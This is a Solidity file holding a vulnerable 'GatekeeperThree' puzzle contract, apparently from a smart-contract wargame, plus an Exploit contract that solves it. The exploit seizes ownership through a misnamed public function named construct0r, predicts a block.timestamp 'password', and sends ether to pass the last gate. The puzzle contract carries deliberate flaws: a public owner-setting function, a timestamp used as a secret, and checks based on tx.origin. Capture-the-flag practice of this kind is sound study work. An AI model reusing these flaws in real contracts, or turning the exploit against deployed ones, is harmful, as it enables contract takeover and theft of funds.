// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
  GatekeeperThree public target;
  address public trick;
  uint private password = block.timestamp;

  constructor (address payable _target) {
    target = GatekeeperThree(_target);
  }

  function checkPassword(uint _password) public returns (bool) {
    if (_password == password) {
      return true;
    }
    password = block.timestamp;
    return false;
  }

  function trickInit() public {
    trick = address(this);
  }

  function trickyTrick() public {
    if (address(this) == msg.sender && address(this) != trick) {
      target.getAllowance(password);
    }
  }
}

contract GatekeeperThree {
  address public owner;
  address public entrant;
  bool public allow_enterance = false;
  SimpleTrick public trick;

  function construct0r() public {
      owner = msg.sender;
  }

  modifier gateOne() {
    require(msg.sender == owner);
    require(tx.origin != owner);
    _;
  }

  modifier gateTwo() {
    require(allow_enterance == true);
    _;
  }

  modifier gateThree() {
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
      _;
    }
  }

  function getAllowance(uint _password) public {
    if (trick.checkPassword(_password)) {
        allow_enterance = true;
    }
  }

  function createTrick() public {
    trick = new SimpleTrick(payable(address(this)));
    trick.trickInit();
  }

  function enter() public gateOne gateTwo gateThree returns (bool entered) {
    entrant = tx.origin;
    return true;
  }

  receive () external payable {}
}

import "exploit_templates/Destructible.sol";
import "exploit_templates/Targeted.sol";


contract Exploit is Destructible, Targeted {
    constructor(address payable target_addr) Targeted(target_addr){
    }

    function exploit() public payable {
        GatekeeperThree gate = GatekeeperThree(payable(Targeted(this).target()));
        gate.construct0r(); // set owner to be me, but tx.origin remains the caller
        gate.createTrick(); // recreate the trick, now the password should be the current block's timestamp
        gate.getAllowance(block.timestamp);
        require(gate.allow_enterance(), "exploit failed, could not get allowance??");
        // gate.getAllowance(block.timestamp);  // we might have to call it twice, but I don't see why the reinit shouldn't work yet

        // send 0.001 ether to `gate` to trigger the gateThree modifier
        payable(address(gate)).call{value: 0.002 ether}("");

        // call `gate.enter()` to trigger the checks
        gate.enter();

        require(gate.entrant() == tx.origin, "exploit failed, could not enter??");

    }

    // no receive function, so we can't receive ether

    receive() external payable {
        revert("I don't want your money! (but thanks for the gas!)  :)");
    }
}